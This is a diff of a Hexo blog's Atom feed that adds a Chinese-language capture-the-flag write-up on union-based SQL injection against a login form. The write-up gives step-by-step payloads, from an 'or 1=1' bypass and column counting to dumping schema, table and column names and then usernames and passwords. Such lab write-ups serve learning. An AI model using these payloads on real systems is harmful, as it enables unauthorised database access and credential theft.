@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2023-11-08T08:35:32.409Z</updated>
+  <updated>2023-11-08T11:49:00.224Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,28 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>sql注入 post.1</title>
+    <link href="http://example.com/2023/11/08/sql%E6%B3%A8%E5%85%A5-post-1/"/>
+    <id>http://example.com/2023/11/08/sql%E6%B3%A8%E5%85%A5-post-1/</id>
+    <published>2023-11-08T10:44:52.000Z</published>
+    <updated>2023-11-08T11:49:00.224Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="sql注入-post-1"><a href="#sql注入-post-1" class="headerlink" title="sql注入 post.1"></a>sql注入 post.1</h1><p>1.先对表单输入账号及密码，用hackbar抓包，发现是host传参；</p><p>2.猜测输入语句（可以直接看源码）：</p><p><code>sql = &quot;SELECT * FROM users WHERE username=&#39;$username&#39; AND password=&#39;$password&#39;&quot;;</code></p><p>对于初学者而言，了解源码结构是很有必要的</p><p>3.寻找注入点个数 ：</p><p>a. username参数必须正确，寻找username的正确值</p><p><code>username=1&#39; or 1=1 #&amp;password=123</code> </p><p>得出用户名为why</p><p>b. 寻找注入点个数</p><p><code>username=1&#39; order by 3 #&amp;password=123</code></p><p>从1试到3，取四的时候报错，得出三个点</p><p>4.寻找显示位(联合查询的前头必须是不存在的，错误的)</p><p><code>username=123&#39; union select 1, 2, 3 #&amp;password=123</code></p><p>‘2’  显示，判断2所在位置为显示位</p><p>5.爆库</p><p><code>username=123&#39; union select 1,group_concat(schema_name),3 from information_schema.schemata #&amp;password=123</code></p><p>需要ez_sql</p><p>6.爆表</p><p><code>username=123&#39; union select 1,group_concat(table_name),3 from</code></p><p><code>information_schema.tables where table_schema=&#39;ez_sql&#39;#&amp;password=123</code></p><p>需要users</p><p>7.爆列</p><p><code>username=123&#39; union select 1,group_concat(column_name),3 from information_schema.columns where</code> </p><p><code>table_name=&#39;users&#39; #&amp;password=123</code></p><p>得出：id,username,password</p><p>8.爆值(不清楚哪个列没关系，全爆)</p><p><code>username=123&#39; union select 1,group_concat(id,username,password),3 from ez_sql.users#&amp;password=123</code></p><p>得出flag：<code>ROIS&#123;sqli_1s_in7ere5tingwaku&#125;</code></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;sql注入-post-1&quot;&gt;&lt;a href=&quot;#sql注入-post-1&quot; class=&quot;headerlink&quot; title=&quot;sql注入 post.1&quot;&gt;&lt;/a&gt;sql注入 post.1&lt;/h1&gt;&lt;p&gt;1.先对表单输入账号及密码，用hackbar抓包，发现是ho</summary>
+      
+    
+    
+    
+    
+    <category term="post" scheme="http://example.com/tags/post/"/>
+    
+  </entry>
   
   <entry>
     <title>SQLI_lab.less.1andless.2</title>
